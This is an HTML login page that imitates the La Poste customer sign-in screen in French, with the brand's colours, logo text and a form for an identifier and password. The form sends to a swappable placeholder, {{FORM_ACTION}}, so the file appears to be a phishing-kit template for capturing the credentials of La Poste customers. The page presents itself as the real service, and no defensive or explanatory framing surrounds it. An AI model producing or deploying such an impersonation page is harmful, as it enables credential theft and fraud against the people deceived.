<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - La Poste</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'La Poste', 'Helvetica Neue', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; color: #333; }
        .header { background: #003b7a; padding: 16px 5%; }
        .logo { font-size: 1.5rem; font-weight: 700; color: #fff; }
        .logo span { color: #ffcb00; }
        .center { display: flex; justify-content: center; align-items: center; padding: 40px; }
        .card { background: #fff; width: 100%; max-width: 440px; padding: 40px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); border-top: 4px solid #ffcb00; }
        h1 { font-size: 1.35rem; font-weight: 700; margin-bottom: 24px; color: #003b7a; }
        label { display: block; font-size: 0.9rem; font-weight: 600; margin-bottom: 8px; color: #333; }
        input { width: 100%; height: 48px; padding: 0 16px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
        input:focus { outline: none; border-color: #003b7a; }
        button { width: 100%; height: 48px; background: #003b7a; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #002a57; }
        .links { margin-top: 20px; font-size: 14px; }
        .links a { color: #003b7a; text-decoration: none; }
        .links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">La<span> Poste</span></div>
    </header>
    <div class="center">
        <div class="card">
            <h1>Accédez à votre espace client</h1>
            <form method="POST" action="{{FORM_ACTION}}">
                <label for="login">Identifiant ou adresse e-mail</label>
                <input type="text" id="login" name="login" placeholder="Votre identifiant" required autocomplete="username">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" placeholder="Votre mot de passe" required autocomplete="current-password">
                <button type="submit">Se connecter</button>
            </form>
            <p class="links"><a href="#">Identifiant ou mot de passe oublié ?</a></p>
        </div>
    </div>
</body>
</html>
